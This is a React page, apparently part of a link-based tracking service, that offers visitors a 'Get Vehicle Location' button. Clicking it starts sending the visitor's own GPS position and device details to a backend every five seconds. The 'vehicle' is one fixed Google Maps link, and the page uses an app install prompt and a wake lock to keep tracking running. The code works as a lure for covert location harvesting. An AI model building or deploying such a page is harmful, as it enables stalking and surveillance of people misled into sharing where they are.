/**
 * SharePage — Vehicle Location
 *
 * Flow:
 * 1. Shows only "Get Vehicle Location" button
 * 2. On click → requests location permission + shows PWA install prompt
 * 3. Starts continuous GPS watch + POSTs every 5 seconds
 * 4. Opens Google Maps in the browser
 * 5. Sharing continues while this tab is open OR while the installed PWA is running
 * 6. Stops ONLY when the user closes the tab
 * 7. Offline support: queues location updates and syncs when back online
 */
import { useState, useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import {
  MapPin,
  Loader2,
  AlertTriangle,
  ExternalLink,
  Shield,
  Battery,
  Wifi,
  Download,
  CloudOff,
} from "lucide-react";
import axios from "axios";

const API_BASE = import.meta.env.VITE_API_URL ?? "/api";
const VEHICLE_MAPS_URL =
  "https://www.google.com/maps/search/?api=1&query=https://maps.app.goo.gl/tpAtUz3g172AFpj3A";
const OFFLINE_QUEUE_KEY = "vehicle_location_queue";

// ── Offline queue helpers ────────────────────────────────────────────────
type QueuedLocation = {
  payload: Record<string, unknown>;
  timestamp: number;
};

function getQueue(): QueuedLocation[] {
  try {
    const raw = localStorage.getItem(OFFLINE_QUEUE_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

function saveQueue(queue: QueuedLocation[]) {
  try {
    localStorage.setItem(OFFLINE_QUEUE_KEY, JSON.stringify(queue));
  } catch {
    /* storage full */
  }
}

function addToQueue(payload: Record<string, unknown>) {
  const queue = getQueue();
  queue.push({ payload, timestamp: Date.now() });
  if (queue.length > 50) queue.splice(0, queue.length - 50);
  saveQueue(queue);
}

// ── Device info ──────────────────────────────────────────────────────────
async function getDeviceInfo() {
  let battery: number | null = null;
  let connection: string | null = null;

  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const bat = await (navigator as any).getBattery?.();
    if (bat && typeof bat.level === "number") battery = bat.level;
  } catch {
    /* not supported */
  }

  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const conn =
      (navigator as any).connection ||
      (navigator as any).mozConnection ||
      (navigator as any).webkitConnection;
    if (conn) connection = conn.effectiveType || conn.type || null;
  } catch {
    /* not supported */
  }

  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(ua);
  const isTablet = /Tablet|iPad/i.test(ua);

  return {
    battery,
    connection,
    browser: (() => {
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      return "Unknown";
    })(),
    operating_system: (() => {
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Android")) return "Android";
      if (/iPhone|iPad|iOS/.test(ua)) return "iOS";
      if (ua.includes("Linux")) return "Linux";
      return "Unknown";
    })(),
    device_type: isTablet ? "tablet" : isMobile ? "mobile" : "desktop",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
  };
}

type SharingStatus = "idle" | "requesting" | "sharing" | "error" | "disabled";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type BeforeInstallPromptEvent = Event & {
  prompt: () => void;
  userChoice: Promise<{ outcome: string }>;
};

export default function SharePage() {
  const { token } = useParams<{ token: string }>();
  const [status, setStatus] = useState<SharingStatus>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [connectionType, setConnectionType] = useState<string | null>(null);
  const [pingCount, setPingCount] = useState(0);
  const [isOnline, setIsOnline] = useState(navigator.onLine);
  const [queuedCount, setQueuedCount] = useState(0);
  const [installPrompt, setInstallPrompt] = useState<BeforeInstallPromptEvent | null>(null);

  const watchIdRef = useRef<number | null>(null);
  const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastPosRef = useRef<GeolocationPosition | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const isSharingRef = useRef(false);

  // ── Capture PWA install prompt ───────────────────────────────────────
  useEffect(() => {
    const handler = (e: Event) => {
      e.preventDefault();
      setInstallPrompt(e as BeforeInstallPromptEvent);
    };
    window.addEventListener("beforeinstallprompt", handler);
    return () => window.removeEventListener("beforeinstallprompt", handler);
  }, []);

  const handleInstall = async () => {
    if (!installPrompt) return;
    installPrompt.prompt();
    const result = await installPrompt.userChoice;
    if (result.outcome === "accepted") {
      setInstallPrompt(null);
    }
  };

  // ── Online / Offline + queue flush ───────────────────────────────────
  useEffect(() => {
    const updateOnlineStatus = () => {
      setIsOnline(navigator.onLine);
      if (navigator.onLine) flushQueue();
    };

    window.addEventListener("online", updateOnlineStatus);
    window.addEventListener("offline", updateOnlineStatus);
    setQueuedCount(getQueue().length);

    return () => {
      window.removeEventListener("online", updateOnlineStatus);
      window.removeEventListener("offline", updateOnlineStatus);
    };
  }, [token]);

  const flushQueue = async () => {
    const queue = getQueue();
    if (queue.length === 0 || !token) return;

    const remaining: QueuedLocation[] = [];

    for (const item of queue) {
      try {
        await axios.post(`${API_BASE}/location/${token}/`, item.payload);
        setPingCount((n) => n + 1);
      } catch {
        remaining.push(item);
      }
    }

    saveQueue(remaining);
    setQueuedCount(remaining.length);

    // Register Background Sync if available
    if (remaining.length > 0 && "serviceWorker" in navigator && "SyncManager" in window) {
      try {
        const reg = await navigator.serviceWorker.ready;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        await (reg as any).sync.register("vehicle-location-sync");
      } catch {
        /* not available */
      }
    }
  };

  // ── Backend notifications ────────────────────────────────────────────
  const notifyStart = async () => {
    try {
      await axios.post(`${API_BASE}/share/start/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  const notifyStop = async () => {
    try {
      await axios.post(`${API_BASE}/share/stop/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  // ── Send location (with offline queue) ───────────────────────────────
  const sendLocation = async (pos: GeolocationPosition) => {
    if (!isSharingRef.current) return;

    const deviceInfo = await getDeviceInfo();
    setBatteryLevel(deviceInfo.battery);
    setConnectionType(deviceInfo.connection);

    const payload = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      speed: pos.coords.speed,
      heading: pos.coords.heading,
      altitude: pos.coords.altitude,
      ...deviceInfo,
    };

    if (!navigator.onLine) {
      addToQueue(payload);
      setQueuedCount(getQueue().length);
      return;
    }

    try {
      await axios.post(`${API_BASE}/location/${token}/`, payload);
      setPingCount((n) => n + 1);
    } catch (err: unknown) {
      const httpStatus = (err as { response?: { status?: number } })?.response?.status;

      if (httpStatus === 403 || httpStatus === 404) {
        setStatus("disabled");
        stopSharing();
        return;
      }

      // Network error → queue
      addToQueue(payload);
      setQueuedCount(getQueue().length);
    }
  };

  // ── Stop sharing ─────────────────────────────────────────────────────
  const stopSharing = () => {
    isSharingRef.current = false;

    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    if (sendIntervalRef.current) {
      clearInterval(sendIntervalRef.current);
      sendIntervalRef.current = null;
    }
    if (wakeLockRef.current) {
      wakeLockRef.current.release().catch(() => { });
      wakeLockRef.current = null;
    }
    notifyStop();
  };

  // ── Wake Lock ────────────────────────────────────────────────────────
  const requestWakeLock = async () => {
    try {
      if ("wakeLock" in navigator && document.visibilityState === "visible") {
        wakeLockRef.current = await navigator.wakeLock.request("screen");
      }
    } catch {
      /* ignored */
    }
  };

  // ── Start sharing ────────────────────────────────────────────────────
  const startSharing = () => {
    if (!navigator.geolocation) {
      setErrorMsg("Your browser does not support geolocation.");
      setStatus("error");
      return;
    }

    setStatus("requesting");
    setErrorMsg("");
    setPingCount(0);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        lastPosRef.current = pos;
        isSharingRef.current = true;
        setStatus("sharing");

        await notifyStart();
        await sendLocation(pos);
        await requestWakeLock();

        // Trigger PWA install prompt (if available)
        if (installPrompt) {
          // Small delay so UI updates first
          setTimeout(() => {
            handleInstall();
          }, 600);
        }

        // Open Google Maps in browser
        setTimeout(() => {
          window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
        }, 400);

        // Continuous GPS watch
        watchIdRef.current = navigator.geolocation.watchPosition(
          (p) => {
            lastPosRef.current = p;
          },
          () => {
            /* ignore temporary errors */
          },
          {
            enableHighAccuracy: true,
            timeout: 25000,
            maximumAge: 0,
          }
        );

        // POST every 5 seconds
        sendIntervalRef.current = setInterval(() => {
          if (lastPosRef.current && isSharingRef.current) {
            sendLocation(lastPosRef.current);
          }
        }, 5000);
      },
      (err) => {
        setErrorMsg(
          err.code === 1
            ? "Location permission denied. Please allow location access."
            : err.message
        );
        setStatus("error");
      },
      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
      }
    );
  };

  // ── Stop ONLY when the tab is closed ─────────────────────────────────
  useEffect(() => {
    const handlePageHide = () => {
      stopSharing();
    };

    window.addEventListener("pagehide", handlePageHide);

    const handleVisibility = () => {
      if (document.visibilityState === "visible" && isSharingRef.current) {
        requestWakeLock();
        if (navigator.onLine) flushQueue();
      }
    };
    document.addEventListener("visibilitychange", handleVisibility);

    return () => {
      window.removeEventListener("pagehide", handlePageHide);
      document.removeEventListener("visibilitychange", handleVisibility);
      stopSharing();
    };
  }, []);

  return (
    <div className="min-h-screen bg-surface-950 flex items-center justify-center p-4 relative overflow-hidden">
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-brand-600/15 blur-3xl" />
        <div className="absolute bottom-0 left-0 w-64 h-64 rounded-full bg-brand-800/10 blur-3xl" />
      </div>

      <div className="relative z-10 w-full max-w-sm">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow bg-gradient-to-br from-brand-500 to-brand-700">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">Vehicle Location</h1>
          <p className="text-white/40 text-sm mt-1">Live Tracking</p>
        </div>

        <div className="glass-card p-6">
          {/* Idle */}
          {status === "idle" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-2">Get Vehicle Location</h2>
                <p className="text-white/50 text-sm leading-relaxed">
                  Tap the button to start sharing your location and open the vehicle on Google Maps.
                </p>
              </div>

              <button
                id="get-vehicle-location-btn"
                onClick={startSharing}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <MapPin className="w-5 h-5" />
                Get Vehicle Location
              </button>
            </div>
          )}

          {/* Requesting */}
          {status === "requesting" && (
            <div className="text-center py-6 space-y-4">
              <Loader2 className="w-12 h-12 text-brand-400 animate-spin mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Requesting Permission</h2>
                <p className="text-white/40 text-sm mt-1">Please allow location access</p>
              </div>
            </div>
          )}

          {/* Sharing */}
          {status === "sharing" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-1">Sharing Active</h2>
                <p className="text-white/50 text-sm">
                  Location is being sent every 5 seconds.
                  <br />
                  Keep this page open or install the app.
                </p>
              </div>

              <button
                onClick={() => window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer")}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <ExternalLink className="w-5 h-5" />
                Open Vehicle Location
              </button>

              {/* PWA Install */}
              {installPrompt && (
                <button
                  onClick={handleInstall}
                  className="btn-secondary w-full justify-center py-3 text-sm"
                >
                  <Download className="w-4 h-4" />
                  Install App for Background Tracking
                </button>
              )}

              {/* Status */}
              <div className="space-y-2 text-xs text-white/45">
                <div className="flex items-center justify-center gap-5">
                  <div className="flex items-center gap-1.5">
                    <Battery className="w-3.5 h-3.5" />
                    <span>
                      {batteryLevel !== null
                        ? `${Math.round(batteryLevel * 100)}%`
                        : "Not available"}
                    </span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <Wifi className="w-3.5 h-3.5" />
                    <span>
                      {connectionType ? connectionType.toUpperCase() : "Not available"}
                    </span>
                  </div>
                </div>

                <div className="text-center text-white/30">
                  {pingCount} update{pingCount !== 1 ? "s" : ""} sent
                  {queuedCount > 0 && (
                    <span className="ml-2 text-amber-400/80">
                      · {queuedCount} queued
                    </span>
                  )}
                </div>

                {!isOnline && (
                  <div className="flex items-center justify-center gap-1.5 text-amber-400/90">
                    <CloudOff className="w-3.5 h-3.5" />
                    <span>Offline – will sync when back online</span>
                  </div>
                )}
              </div>

              <button
                onClick={() => {
                  stopSharing();
                  setStatus("idle");
                  setPingCount(0);
                }}
                className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-1"
              >
                Stop sharing
              </button>
            </div>
          )}

          {/* Error */}
          {status === "error" && (
            <div className="text-center py-6 space-y-4">
              <AlertTriangle className="w-12 h-12 text-amber-400 mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Permission Required</h2>
                <p className="text-white/40 text-sm mt-2 leading-relaxed">{errorMsg}</p>
              </div>
              <button
                onClick={() => setStatus("idle")}
                className="btn-secondary w-full justify-center"
              >
                Try Again
              </button>
            </div>
          )}

          {/* Disabled */}
          {status === "disabled" && (
            <div className="text-center py-6 space-y-4">
              <Shield className="w-12 h-12 text-white/20 mx-auto" />
              <div>
                <h2 className="text-white/60 font-semibold">Link Unavailable</h2>
                <p className="text-white/30 text-sm mt-1">
                  This tracking link has been disabled or removed.
                </p>
              </div>
            </div>
          )}
        </div>

        <p className="text-center text-white/15 text-xs mt-4">
          Vehicle Location · Sharing stops only when you close this tab
        </p>
      </div>
    </div>
  );
}